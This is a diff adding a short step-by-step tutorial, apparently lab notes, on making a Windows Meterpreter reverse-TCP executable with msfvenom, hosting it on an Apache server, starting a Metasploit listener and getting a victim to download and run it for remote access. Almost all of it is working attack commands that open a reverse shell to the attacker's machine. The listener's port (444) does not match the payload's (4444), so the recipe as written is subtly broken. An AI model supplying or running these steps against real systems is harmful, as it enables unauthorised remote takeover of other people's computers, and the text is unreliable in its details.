@@ -1,0 +1,37 @@
+CREATING A MALICIOUS FILE WITH MSFvenom
+
+Only works on systems without antivirus programs.
+
+-Type "msfconsole" in terminal to start the Metasploit framework.
+
+-Enter this command for the payload for the reverse TCP connection
+$ "msfvenom -p windows/meterpreter/reverse_tcp LHOST={your-local-IP-address}
+LPORT=4444 --format=exe > {filename}.exe"
+** Your local IP address can be found by $ ifconfig
+
+-Copy the file to the location for the Apache web server
+$ cp {filename}.exe /var/www/html
+
+-Run the web server using
+$ service apache2 start
+
+-Set the listener to capture the session when the victim runs the file
+$ use exploit/multi/handler
+$ set payload windows/meterpreter/reverse_tcp
+$ set LHOST {your-local-IP address}
+$ set LPORT 444
+
+- To listen for connections
+$ run
+
+--> Switch from Kali VM to Windows machine <--
+- Open a web browser
+- The local IP address from Kali machine where the Apache web server 
+is running
+(in the search bar): {local-IP}/{filename}.exe
+- Save the file, and run it.
+
+--> Switch to Kali VM <--
+- You now have access to the target machine.
+- To view system info, type: 
+$ sysinfo
